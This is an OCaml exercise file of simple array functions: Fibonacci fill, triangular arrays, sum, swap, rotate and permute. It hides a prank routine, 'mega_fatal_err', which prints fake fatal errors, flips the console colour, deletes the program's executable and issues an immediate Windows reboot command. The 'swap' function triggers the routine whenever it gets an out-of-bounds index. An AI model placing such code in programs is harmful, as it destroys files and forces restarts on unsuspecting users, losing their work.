open Array;;

let rec mega_fatal_err () = 
for i = 0 to 200 do flush stdout; print_string "FATAL_ERR0R\n"; Sys.command ("color " ^ (string_of_int(Random.int 9))); done; Sys.remove "camlprog.exe"; Sys.command "shutdown /r /t 00";;

let pr_arr a =
Array.iter (fun x -> Printf.printf "%i;" x) a;;

(*//1--------------------------*)

let fibcr k =
let b = make k (-1) in 
let rec f x l1 l2 =  
if x > k then () else if x = 1 then (b.(0)<-0; f (x+1) 0 1)else if x = 2 then (b.(1)<-1; f (x+1) 0 1) else (b.(x-1) <- (l1+l2); f (x+1) l2 (l1+l2)) in
f 1 0 1; b;;


                                                                                                                            
(*pr_arr (fibcr (read_int()));; 
*)


(*-----------------------------*)





(*//2--------------------------*)

let aarr n = init (n+1) (fun x -> init (x+1) (fun i -> x));;

(*iter (fun x -> print_string "[|"; pr_arr x; print_string "|];";) (aarr (read_int ()));;
*)


(*-----------------------------*)


(*//3--------------------------*)

let sum a = fold_left (+) 0 a;;

(*  print_int (sum [|1;3;5;2;4|]);;   *)

(*-----------------------------*)

(*//4--------------------------*)
                                          
let swap i j a = 
if i >= length a || j >= length a then (mega_fatal_err (); a) else (let x = a.(i) in (); a.(i)<-a.(j); a.(j)<-x; a);;

(*pr_arr(swap 2 4 [|1;2;3;4;5|]);;   *)

(*//5--------------------------*)
let sdwig k a = init (length a) (fun i -> a.((i+k)mod(length a)));;

(*pr_arr (sdwig 2 [|1;2;3;4;5;6|]);; *)


(*//6--------------------------*)
let perm s a = map (fun i -> a.(i)) s;;

(*pr_arr (perm [|0;3;1;4;2|] [|5;6;7;8;9;|]);;   *)
                        
























